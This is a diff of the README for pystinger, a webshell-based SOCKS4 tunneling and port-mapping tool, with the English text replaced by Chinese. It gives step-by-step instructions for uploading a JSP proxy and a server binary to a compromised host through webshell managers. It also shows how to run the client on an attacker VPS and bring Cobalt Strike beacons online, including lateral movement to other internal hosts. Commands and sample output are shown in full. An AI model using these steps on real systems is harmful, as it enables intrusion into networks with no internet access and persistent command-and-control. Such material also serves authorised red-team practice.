@@ -1,26 +1,27 @@
-# pystinger
+# 毒刺(pystinger)
 
-English | [简体中文](./readme_cn.md) 
+简体中文 | [English](./readme_cn.md) 
 
-Pystinger implements **SOCK4 proxy** and **port mapping** through webshell.
+毒刺(pystinger)通过webshell实现**内网SOCK4代理**,**端口映射**.
 
-It can be directly used by metasploit-framework, viper, cobalt strike for session online.
+可直接用于metasploit-framework,viper,cobalt strike上线.
 
-Pystinger is developed in python, and currently supports three proxy scripts: php, jsp(x) and aspx.
+主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.
 
-Principle introduction : [红队攻防实践：不出网主机搭建内网隧道新思路](https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w)
+原理介绍 : [红队攻防实践：不出网主机搭建内网隧道新思路](https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w)
 
-# Usage
-> Suppose the domain name of the server is[ http://example.com :8080](http://192.168.3.11:8080) The intranet IPAddress of the server intranet is 192.168.3.11
+# 使用方法
 
-## SOCK4 Proxy
+> 假设不出网服务器域名为 [http://example.com:8080](http://192.168.3.11:8080) ,服务器内网IP地址为192.168.3.11
+
+## SOCK4代理
 
 
-* ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
-* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe```to start pystinger-server
-> Don't run ```D:/xxx/singer_server.exe``` directly,it will cause TCP disconnection
-* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
-* Your will see following output
+* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 ```UTF-8```
+* 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe```启动服务端
+> 不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
+* vps执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
+* 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
@@ -47,16 +48,16 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
 2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
 ```
-* Now you have started a *socks4a proxy* on VPS ```127.0.0.1:60000``` for intranet of ```example.com```.
-* Now the target server(```example.com```) ```127.0.0.1:60020``` has been mapped to the VPS ``` 127.0.0.1:60020```
+* 此时已经在vps```127.0.0.1:60000```启动了一个```example.com```所在内网的**socks4a**代理
+* 此时已经将目标服务器的```127.0.0.1:60020```映射到vps的```127.0.0.1:60020```
 
-## cobaltstrike`s beacon online for single target
+## cobalt strike单主机上线
 
-* ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
-* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe```to start pystinger-server
-> Don't run ```D:/xxx/singer_server.exe``` directly,it will cause TCP disconnection
-* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
-* Your will see following output
+* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 ```UTF-8```
+* 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe```启动服务端
+> 不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
+* stinger_client命令行执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
+* 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
@@ -83,16 +84,16 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
 2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
 ```
-* Add listener on cobaltstrike,Listener port is ```60020``` (Handler/LISTEN port in ```RAT CONFIG``` of output ),listener address is ```127.0.0.1```
-* Generate payload,upload to the target and run.
+* cobalt strike添加监听,端口选择输出信息RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为127.0.0.1
+* 生成payload,上传到主机运行后即可上线
 
-## cobaltstrike`s beacon online for multiple targets
+## cobalt strike多主机上线
 
-* ```proxy.jsp``` Upload to the target server and ensure that [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) can access,the page returns ```UTF-8```
-* ```stinger_server.exe``` Upload to the target server,AntSword run cmd```start D:/XXX/stinger_server.exe  192.168.3.11```to start pystinger-server (192.168.3.11 is intranet ipaddress of the target)
-> 192.168.3.11 can change to 0.0.0.0
-* Run ```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000``` on your VPS
-* Your will see following output
+* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 ```UTF-8```
+* 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe 192.168.3.11```启动服务端
+> 192.168.3.11可以改成0.0.0.0
+* stinger_client命令行执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
+* 如下输出表示成功
 ```
 root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
 2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
@@ -119,25 +120,28 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
 2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
 ```
-* Add listener on cobaltstrike,Listener port is ```60020``` (Handler/LISTEN port in ```RAT CONFIG``` of output ),listener address is ```192.168.3.11```
-* Generate payload,upload to the target and run.
-* When lateral movement to other hosts, you can point the payload to 192.168.3.11:60020 to make beacon online
+* cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为192.168.3.11(example.com的内网IP地址)
+* 生成payload,上传到主机运行后即可上线
+* 横向移动到其他主机时可以将payload指向192.168.3.11:60020即可实现出网上线
 
-## Custom header and proxy
-* If the webshell needs to configure cookie or authorization, the request header can be configured through the -- header parameter
+## 定制Header及proxy
+* 如果webshell需要配置Cookie或者Authorization,可通过--header参数配置请求头
+
 ```--header "Authorization: XXXXXX,Cookie: XXXXX"```
 
-* If the webshell needs to be accessed by proxy, you can set the proxy through -- proxy
+* 如果webshell需要通过代理访问,可通过--proxy设置代理
+
 ```--proxy "socks5:127.0.0.1:1081"```
 
-# Related tools
+
+# 相关工具
 [https://github.com/nccgroup/ABPTTS](https://github.com/nccgroup/ABPTTS)
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
 [https://github.com/SECFORCE/Tunna](https://github.com/SECFORCE/Tunna)
 
-# Tested
+# 已测试
 ## stinger_server\stinger_client
 * windows 
 * linux
@@ -146,14 +150,16 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 * tomcat7.0 
 * iis8.0
 
-# Update log
+# 更新日志
 **2.0**
-Update time: 2019-09-29
-* Socks4 proxy service moves to client
+更新时间: 2019-09-29
+* 将socks4代理服务移动到客户端
+* 不再支持端口转发功能
 
 **2.1**
-Update time: 2020-01-07
-* Support cobaltstrike online (port mapping)
+更新时间: 2020-01-07
+* 支持CS上线功能(即端口映射功能)
+
 
 The development is supported by the software from jetbrains.</br>
 https://www.jetbrains.com/?from=pystinger
